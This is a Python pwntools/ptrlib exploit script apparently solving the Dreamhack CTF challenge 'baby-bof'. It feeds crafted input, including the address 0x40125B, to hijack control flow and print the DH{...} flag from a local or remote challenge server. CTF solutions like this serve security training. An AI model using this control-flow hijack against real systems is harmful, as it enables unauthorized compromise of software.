#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./baby-bof")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 23857)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendlineafter("name: ", b"A" * 8)
    # hex_value = "0x000000000040125B"
    io.sendlineafter("hex value: ", "0x000000000040125B")
    io.sendlineafter("integer count: ", "8")

    io.recvuntil("DH{")
    flag = "DH{" + io.recvuntil("}").decode()
    print(f"flag: {flag}")
    return


if __name__ == "__main__":
    main()
